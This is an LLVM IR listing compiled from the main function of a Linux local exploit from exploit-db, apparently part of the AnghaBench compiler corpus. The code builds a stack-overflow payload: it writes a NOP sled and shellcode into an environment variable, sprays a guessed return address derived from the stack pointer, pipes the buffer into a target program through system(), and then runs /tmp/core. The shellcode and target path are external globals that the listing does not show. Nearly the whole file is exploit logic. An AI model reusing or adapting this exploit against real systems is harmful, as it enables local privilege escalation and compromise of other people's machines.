; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_1170.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_1170.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@DBUF = common dso_local global i32 0, align 4
@DAT = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [2 x i8] c"w\00", align 1
@.str.1 = private unnamed_addr constant [7 x i8] c"OWNED\0A\00", align 1
@OFFSET = common dso_local global i32 0, align 4
@ALIGN = common dso_local global i32 0, align 4
@shellcode = common dso_local global i8* null, align 8
@NOP = common dso_local global i8 0, align 1
@.str.2 = private unnamed_addr constant [6 x i8] c"UPEX=\00", align 1
@stderr = common dso_local global i32* null, align 8
@.str.3 = private unnamed_addr constant [39 x i8] c"Ret-addr: %#x, offset: %d, align: %d.\0A\00", align 1
@.str.4 = private unnamed_addr constant [26 x i8] c"(printf '1\0A0\0AC\0A%s\0A0\0A')|%s\00", align 1
@PATH = common dso_local global i8* null, align 8
@.str.5 = private unnamed_addr constant [19 x i8] c"Score: core wins!\0A\00", align 1
@.str.6 = private unnamed_addr constant [10 x i8] c"/tmp/core\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i64, align 8
  %8 = alloca [7192 x i8], align 16
  %9 = alloca i64, align 8
  %10 = alloca i32*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i64, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %15 = load i32, i32* @DBUF, align 4
  %16 = zext i32 %15 to i64
  %17 = call i8* @llvm.stacksave()
  store i8* %17, i8** %6, align 8
  %18 = alloca i8, i64 %16, align 16
  store i64 %16, i64* %7, align 8
  %19 = load i32, i32* @DBUF, align 4
  %20 = add nsw i32 %19, 22
  %21 = zext i32 %20 to i64
  %22 = alloca i8, i64 %21, align 16
  store i64 %21, i64* %9, align 8
  %23 = load i8**, i8*** %5, align 8
  %24 = getelementptr inbounds i8*, i8** %23, i64 0
  %25 = load i8*, i8** %24, align 8
  %26 = call i32 @usage(i8* %25)
  %27 = load i32, i32* @DAT, align 4
  %28 = call i32 @unlink(i32 %27)
  %29 = load i32, i32* @DAT, align 4
  %30 = call i32* @fopen(i32 %29, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str, i64 0, i64 0))
  store i32* %30, i32** %10, align 8
  %31 = load i32*, i32** %10, align 8
  %32 = call i32 (i32*, i8*, ...) @fprintf(i32* %31, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i64 0, i64 0))
  %33 = load i32*, i32** %10, align 8
  %34 = call i32 @fclose(i32* %33)
  %35 = load i32, i32* %4, align 4
  %36 = icmp sgt i32 %35, 1
  br i1 %36, label %37, label %42

37:                                               ; preds = %2
  %38 = load i8**, i8*** %5, align 8
  %39 = getelementptr inbounds i8*, i8** %38, i64 1
  %40 = load i8*, i8** %39, align 8
  %41 = call i32 @atoi(i8* %40)
  store i32 %41, i32* %12, align 4
  br label %44

42:                                               ; preds = %2
  %43 = load i32, i32* @OFFSET, align 4
  store i32 %43, i32* %12, align 4
  br label %44

44:                                               ; preds = %42, %37
  %45 = load i32, i32* %4, align 4
  %46 = icmp sgt i32 %45, 2
  br i1 %46, label %47, label %52

47:                                               ; preds = %44
  %48 = load i8**, i8*** %5, align 8
  %49 = getelementptr inbounds i8*, i8** %48, i64 2
  %50 = load i8*, i8** %49, align 8
  %51 = call i32 @atoi(i8* %50)
  store i32 %51, i32* %13, align 4
  br label %54

52:                                               ; preds = %44
  %53 = load i32, i32* @ALIGN, align 4
  store i32 %53, i32* %13, align 4
  br label %54

54:                                               ; preds = %52, %47
  %55 = call i32 (...) @get_sp()
  %56 = load i32, i32* %12, align 4
  %57 = sub nsw i32 %55, %56
  %58 = sext i32 %57 to i64
  store i64 %58, i64* %14, align 8
  %59 = load i32, i32* %13, align 4
  %60 = icmp sgt i32 %59, 0
  br i1 %60, label %61, label %74

61:                                               ; preds = %54
  store i32 0, i32* %11, align 4
  br label %62

62:                                               ; preds = %70, %61
  %63 = load i32, i32* %11, align 4
  %64 = load i32, i32* %13, align 4
  %65 = icmp slt i32 %63, %64
  br i1 %65, label %66, label %73

66:                                               ; preds = %62
  %67 = load i32, i32* %11, align 4
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds i8, i8* %18, i64 %68
  store i8 105, i8* %69, align 1
  br label %70

70:                                               ; preds = %66
  %71 = load i32, i32* %11, align 4
  %72 = add nsw i32 %71, 1
  store i32 %72, i32* %11, align 4
  br label %62

73:                                               ; preds = %62
  br label %74

74:                                               ; preds = %73, %54
  %75 = load i32, i32* %13, align 4
  store i32 %75, i32* %11, align 4
  br label %76

76:                                               ; preds = %86, %74
  %77 = load i32, i32* %11, align 4
  %78 = load i32, i32* @DBUF, align 4
  %79 = icmp slt i32 %77, %78
  br i1 %79, label %80, label %89

80:                                               ; preds = %76
  %81 = load i64, i64* %14, align 8
  %82 = load i32, i32* %11, align 4
  %83 = sext i32 %82 to i64
  %84 = getelementptr inbounds i8, i8* %18, i64 %83
  %85 = bitcast i8* %84 to i64*
  store i64 %81, i64* %85, align 1
  br label %86

86:                                               ; preds = %80
  %87 = load i32, i32* %11, align 4
  %88 = add nsw i32 %87, 4
  store i32 %88, i32* %11, align 4
  br label %76

89:                                               ; preds = %76
  store i32 0, i32* %11, align 4
  br label %90

90:                                               ; preds = %103, %89
  %91 = load i32, i32* %11, align 4
  %92 = load i8*, i8** @shellcode, align 8
  %93 = call i32 @strlen(i8* %92)
  %94 = sub nsw i32 7192, %93
  %95 = call i32 @strlen(i8* %18)
  %96 = sub nsw i32 %94, %95
  %97 = icmp slt i32 %91, %96
  br i1 %97, label %98, label %106

98:                                               ; preds = %90
  %99 = load i8, i8* @NOP, align 1
  %100 = load i32, i32* %11, align 4
  %101 = sext i32 %100 to i64
  %102 = getelementptr inbounds [7192 x i8], [7192 x i8]* %8, i64 0, i64 %101
  store i8 %99, i8* %102, align 1
  br label %103

103:                                              ; preds = %98
  %104 = load i32, i32* %11, align 4
  %105 = add nsw i32 %104, 1
  store i32 %105, i32* %11, align 4
  br label %90

106:                                              ; preds = %90
  %107 = getelementptr inbounds [7192 x i8], [7192 x i8]* %8, i64 0, i64 0
  %108 = load i32, i32* %11, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds i8, i8* %107, i64 %109
  %111 = load i8*, i8** @shellcode, align 8
  %112 = load i8*, i8** @shellcode, align 8
  %113 = call i32 @strlen(i8* %112)
  %114 = call i32 @memcpy(i8* %110, i8* %111, i32 %113)
  %115 = getelementptr inbounds [7192 x i8], [7192 x i8]* %8, i64 0, i64 0
  %116 = call i32 @memcpy(i8* %115, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.2, i64 0, i64 0), i32 5)
  %117 = getelementptr inbounds [7192 x i8], [7192 x i8]* %8, i64 0, i64 0
  %118 = call i32 @putenv(i8* %117)
  %119 = load i32*, i32** @stderr, align 8
  %120 = load i64, i64* %14, align 8
  %121 = load i32, i32* %12, align 4
  %122 = load i32, i32* %13, align 4
  %123 = call i32 (i32*, i8*, ...) @fprintf(i32* %119, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.3, i64 0, i64 0), i64 %120, i32 %121, i32 %122)
  %124 = load i8*, i8** @PATH, align 8
  %125 = call i32 @sprintf(i8* %22, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.4, i64 0, i64 0), i8* %18, i8* %124)
  %126 = call i32 @system(i8* %22)
  %127 = load i32*, i32** @stderr, align 8
  %128 = call i32 (i32*, i8*, ...) @fprintf(i32* %127, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.5, i64 0, i64 0))
  %129 = call i32 @system(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.6, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  %130 = load i8*, i8** %6, align 8
  call void @llvm.stackrestore(i8* %130)
  %131 = load i32, i32* %3, align 4
  ret i32 %131
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @usage(i8*) #2

declare dso_local i32 @unlink(i32) #2

declare dso_local i32* @fopen(i32, i8*) #2

declare dso_local i32 @fprintf(i32*, i8*, ...) #2

declare dso_local i32 @fclose(i32*) #2

declare dso_local i32 @atoi(i8*) #2

declare dso_local i32 @get_sp(...) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @memcpy(i8*, i8*, i32) #2

declare dso_local i32 @putenv(i8*) #2

declare dso_local i32 @sprintf(i8*, i8*, i8*, i8*) #2

declare dso_local i32 @system(i8*) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
